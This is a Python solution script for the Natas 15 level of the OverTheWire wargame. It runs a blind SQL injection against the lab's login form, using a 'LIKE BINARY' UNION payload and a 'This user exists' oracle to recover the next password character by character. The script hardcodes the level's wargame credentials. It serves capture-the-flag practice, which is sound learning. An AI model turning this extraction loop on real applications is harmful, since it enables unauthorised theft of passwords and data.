import requests
import sys

def extract(url,username,password):
    alpha_num = "012345789abcdefgijklmnopqrstuvwxyzABCDEFGIJKLMNOPQRSTUVWXYZ6hH" 
    flag = ""
    letter = 0
    while letter < len(alpha_num):
        post_data = {
            "username":"\" union select 1,2 from users where password like binary '"+ flag + alpha_num[letter] + "%'-- -",
            }
        sqli_r = requests.post(url,auth=(username,password),data=post_data)
        if "This user exists" in sqli_r.text:
            flag = flag + alpha_num[letter]
            letter = 0
        else:
            sys.stdout.write(f"\rExtracting flag: {flag}{alpha_num[letter].ljust(20)}")
            sys.stdout.flush()
            letter += 1
    print(f"\rThe flag for natas15 is:  {flag.ljust(20)}")

if __name__=="__main__":
    print("Natas 15: SQL Injection time. Patience...")
    url = "http://natas15.natas.labs.overthewire.org/"
    username = "natas15"
    password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
    extract(url,username,password)